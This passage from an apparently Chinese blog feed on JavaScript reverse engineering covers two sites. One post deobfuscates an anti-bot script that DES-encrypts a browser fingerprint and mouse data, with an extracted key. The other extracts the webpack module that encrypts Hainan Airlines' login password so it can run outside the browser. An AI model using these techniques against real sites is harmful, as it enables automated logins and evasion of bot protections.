&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hasSessionStorage</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> !!<span class="variable language_">window</span>.<span class="property">sessionStorage</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isCanvasSupported</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> !(!e.<span class="property">getContext</span> || !e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">isIE</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Microsoft Internet Explorer&quot;</span> === navigator.<span class="property">appName</span> ? !<span class="number">0</span> : !(<span class="string">&quot;Netscape&quot;</span> !== navigator.<span class="property">appName</span> || !<span class="regexp">/Trident/</span>.<span class="title function_">test</span>(navigator.<span class="property">userAgent</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">isIE</span>() &amp;&amp; <span class="variable language_">this</span>.<span class="property">ie_activex</span> ? <span class="variable language_">this</span>.<span class="title function_">getIEPluginsString</span>() : <span class="variable language_">this</span>.<span class="title function_">getRegularPluginsString</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getRegularPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(navigator.<span class="property">plugins</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [e.<span class="property">type</span>, e.<span class="property">suffixes</span>].<span class="title function_">join</span>(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> [e.<span class="property">name</span>, e.<span class="property">description</span>, t].<span class="title function_">join</span>(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">        &#125;, <span class="variable language_">this</span>).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getIEPluginsString</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = [<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>, <span class="string">&quot;AcroPDF.PDF&quot;</span>, <span class="string">&quot;PDF.PdfCtrl&quot;</span>, <span class="string">&quot;QuickTime.QuickTime&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>, <span class="string">&quot;SWCtl.SWCtl&quot;</span>, <span class="string">&quot;WMPlayer.OCX&quot;</span>, <span class="string">&quot;AgControl.AgControl&quot;</span>, <span class="string">&quot;Skype.Detection&quot;</span>];</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">map</span>(e, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e),</span><br><span class="line">                    e</span><br><span class="line">                &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).<span class="title function_">join</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getScreenResolution</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [screen.<span class="property">height</span>, screen.<span class="property">width</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getCanvasFingerprint</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>)</span><br><span class="line">          , t = e.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>)</span><br><span class="line">          , r = <span class="string">&quot;http://valve.github.io&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="property">textBaseline</span> = <span class="string">&quot;top&quot;</span>,</span><br><span class="line">        t.<span class="property">font</span> = <span class="string">&quot;14px &#x27;Arial&#x27;&quot;</span>,</span><br><span class="line">        t.<span class="property">textBaseline</span> = <span class="string">&quot;alphabetic&quot;</span>,</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#f60&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillRect</span>(<span class="number">125</span>, <span class="number">1</span>, <span class="number">62</span>, <span class="number">20</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;#069&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">2</span>, <span class="number">15</span>),</span><br><span class="line">        t.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(102, 204, 0, 0.7)&quot;</span>,</span><br><span class="line">        t.<span class="title function_">fillText</span>(r, <span class="number">4</span>, <span class="number">17</span>),</span><br><span class="line">        e.<span class="title function_">toDataURL</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yexsuom_xee\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="title function_">push</span>(e),</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">length</span> &gt; <span class="number">5</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">shift</span>())</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;obj&quot;</span></span><br><span class="line">  , m = <span class="string">&quot;000215455&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress,</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = keydown,</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrs</span> = [],</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">mcArrps</span> = [];</span><br><span class="line"><span class="keyword">var</span> fingerprint = (<span class="keyword">new</span> referFingerprint).<span class="title function_">get</span>();</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKroleD&quot;</span>, <span class="number">3</span>, <span class="number">3</span>)] = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    mcArrs.<span class="title function_">ex_mouse</span>(e);</span><br><span class="line">    <span class="keyword">var</span> t = &#123;</span><br><span class="line">        <span class="attr">xy</span>: mcArrs,</span><br><span class="line">        <span class="attr">fingerprint</span>: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t)</span><br><span class="line">      , n = <span class="title function_">eq_u</span>(r, <span class="title function_">zznu</span>(zre));</span><br><span class="line">    <span class="variable language_">window</span>[coyp](<span class="title function_">_hqjl</span>(<span class="string">&quot;ycrtrehpixext\\&quot;</span>, <span class="number">7</span>, <span class="number">2</span>) + <span class="string">&quot;=&#x27;&quot;</span> + n + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">var</span> mc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    jQuery &amp;&amp; jQuery.<span class="property">mouseCollection</span>.<span class="title function_">record</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">currentPoint</span>);</span><br><span class="line">        <span class="title function_">zlo</span>(t)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">  , c = <span class="string">&quot;test&quot;</span></span><br><span class="line">  , _maq = _maq || [];</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setAccount&quot;</span>, <span class="string">&quot;AIRJDWEBBJ&quot;</span>]),</span><br><span class="line">_maq.<span class="title function_">push</span>([<span class="string">&quot;_setHnaUserId&quot;</span>, <span class="string">&quot;&quot;</span>]),</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzxolx\\&quot;</span>, <span class="number">3</span>, <span class="number">2</span>)]()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&#x27;&#123;&quot;xy&quot;:[],&quot;fingerprint&quot;:2883398340&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> t = <span class="string">&#x27;52D2841A3485DFFBCF2EA6A0515077CD&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">eq_u</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">      , n = coypJsDk.<span class="property">DES</span>.<span class="title function_">encrypt</span>(e, r, &#123;</span><br><span class="line">        <span class="attr">mode</span>: coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: coypJsDk.<span class="property">pad</span>.<span class="property">Nopk</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">del_html_tags</span>(n.<span class="title function_">toString</span>(), <span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%2B&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">eq_u</span>(e, t))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> 补环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空登录逆向webpack</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BA%E7%99%BB%E5%BD%95%E9%80%86%E5%90%91webpack/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空登录逆向webpack</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：逆向登录密码password（webpack加密）</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101615362.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1、定位加密位置"><a href="#1、定位加密位置" class="headerlink" title="1、定位加密位置"></a>1、定位加密位置</h2><p>打XHR断点，向上跟栈，找到pin密码字段加密处：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101618868.png" alt="image.png"> </p><p>也可以全局搜索关键字 “pin” 定位到函数所在的位置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619915.png" alt="image.png"> </p><h2 id="2、逆向加密函数encryptedString"><a href="#2、逆向加密函数encryptedString" class="headerlink" title="2、逆向加密函数encryptedString"></a>2、逆向加密函数encryptedString</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pin: i.default.encryptedString(t)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encryptedString: function(e) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    var t = e;</span><br><span class="line">                    (new Date).getTime();</span><br><span class="line">                    return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br><span class="line">                    (new Date).getTime(),</span><br><span class="line">                    t</span><br><span class="line">                &#125; catch (t) &#123;</span><br><span class="line">                    return e</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>向上翻，可以明显看到是webpack！！！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101619161.png" alt="image.png"> </p><h2 id="3、webpack扣取代码"><a href="#3、webpack扣取代码" class="headerlink" title="3、webpack扣取代码"></a>3、webpack扣取代码</h2><h3 id="1）找到webpack启动器"><a href="#1）找到webpack启动器" class="headerlink" title="1）找到webpack启动器"></a>1）找到webpack启动器</h3><p>首先，可以看到最终的加密代码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return t = window.isNative ? _.default.encryptedString(e) : m.default.encryptedString(e),</span><br></pre></td></tr></table></figure><p>这块是一个三目表达式，可以就看到真正加密函数为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101620298.png" alt="image.png"> </p><p>这块的对象是 “m” ，向上查找，成功定位到定义 “m” 的位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621743.png" alt="image.png"> </p><p>刚好掉下是定义了函数 E 的位置，所以，这块的加载器，肯定还是 n，所以在这块打断点，刷新页面：</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101621520.png" alt="image.png"></p><p>断点，断下后，找到了启动器的位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622270.png" alt="image.png"> </p><p>简单改写一下启动器，改写后代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  <span class="number">1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)&#125;,</span><br><span class="line">  <span class="number">2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101622158.png" alt="image.png"> </p><h3 id="2）导进加密模块"><a href="#2）导进加密模块" class="headerlink" title="2）导进加密模块"></a>2）导进加密模块</h3><p>根据前面分析，得到这块最先导进的是 “87377” 模块。可以按照顺序先进行导入：</p><p>加密函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m.default.encryptedString(e)</span><br></pre></td></tr></table></figure><p>定义m：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = E(n(87377))</span><br></pre></td></tr></table></figure><p>导入后，发现其实也只需要这一个模块就够了！！！</p><h3 id="3）自定义加密函数"><a href="#3）自定义加密函数" class="headerlink" title="3）自定义加密函数"></a>3）自定义加密函数</h3><p>其实这块也不用特意写，就按照原本代码中的加密，稍微改写一下就行：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="title function_">_b</span>(<span class="string">&quot;87377&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t = e;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">return</span> t = p.<span class="property">default</span>.<span class="title function_">encryptedString</span>(e),</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>(),</span><br><span class="line">      t</span><br><span class="line">  &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">  &#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>代码写好后，运行，成功加密：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101632739.png" alt="image.png"> </p><h1 id="三、完整代码"><a href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><p>几百行就搞定了，本身还是比较简单的！</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _b</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">n</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = &#123;&#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,e)</span><br><span class="line">        <span class="keyword">var</span> s = c[e];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> !== s)</span><br><span class="line">            <span class="keyword">return</span> s.<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> i = c[e] = &#123;</span><br><span class="line">            <span class="attr">id</span>: e,</span><br><span class="line">            <span class="attr">loaded</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> n[e].<span class="title function_">call</span>(i.<span class="property">exports</span>, i, i.<span class="property">exports</span>, b),</span><br><span class="line">        i.<span class="property">loaded</span> = !<span class="number">0</span>,</span><br><span class="line">        i.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">  _b = b</span><br><span class="line">&#125;(&#123;</span><br><span class="line">  <span class="comment">//模块</span></span><br><span class="line">  <span class="number">87377</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(t, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">        &#125;),</span><br><span class="line">        t.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> n, r, o, a = <span class="number">16</span>, u = a, l = <span class="number">65536</span>, c = l &gt;&gt;&gt; <span class="number">1</span>, s = l * l, d = l - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Array</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; n.<span class="property">length</span>; t++)</span><br><span class="line">                n[t] = <span class="number">0</span>;</span><br><span class="line">            r = <span class="keyword">new</span> p,</span><br><span class="line">            (o = <span class="keyword">new</span> p).<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">f</span>(<span class="number">20</span>);</span><br><span class="line">        <span class="title function_">g</span>(<span class="number">1e15</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">p</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">digits</span> = <span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; <span class="number">1</span> == e ? <span class="literal">null</span> : n.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isNeg</span> = !<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title function_">p</span>(!<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> t.<span class="property">digits</span> = e.<span class="property">digits</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            t.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> p;</span><br><span class="line">            t.<span class="property">isNeg</span> = e &lt; <span class="number">0</span>,</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">abs</span>(e);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; e &gt; <span class="number">0</span>; )</span><br><span class="line">                t.<span class="property">digits</span>[n++] = e &amp; d,</span><br><span class="line">                e &gt;&gt;= a;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += e.<span class="title function_">charAt</span>(n);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> _ = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">T</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = t;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">x</span>(e, n), i = _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]]; <span class="number">1</span> == <span class="title function_">G</span>(o[<span class="number">0</span>], r); )</span><br><span class="line">                o = <span class="title function_">x</span>(o[<span class="number">0</span>], n),</span><br><span class="line">                digit = o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>],</span><br><span class="line">                i += _[o[<span class="number">1</span>].<span class="property">digits</span>[<span class="number">0</span>]];</span><br><span class="line">            <span class="keyword">return</span> (e.<span class="property">isNeg</span> ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title function_">h</span>(i)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> E = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>,<span class="string">&quot;7&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;9&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;f&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                t += E[<span class="number">15</span> &amp; e],</span><br><span class="line">                e &gt;&gt;&gt;= <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">h</span>(t)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">S</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = (<span class="title function_">I</span>(e),</span><br><span class="line">            <span class="title function_">I</span>(e)); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">y</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">v</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &gt;= <span class="number">48</span> &amp;&amp; e &lt;= <span class="number">57</span> ? e - <span class="number">48</span> : e &gt;= <span class="number">65</span> &amp;&amp; e &lt;= <span class="number">90</span> ? <span class="number">10</span> + e - <span class="number">65</span> : e &gt;= <span class="number">97</span> &amp;&amp; e &lt;= <span class="number">122</span> ? <span class="number">10</span> + e - <span class="number">97</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">A</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>, n = <span class="title class_">Math</span>.<span class="title function_">min</span>(e.<span class="property">length</span>, <span class="number">4</span>), r = <span class="number">0</span>; r &lt; n; ++r)</span><br><span 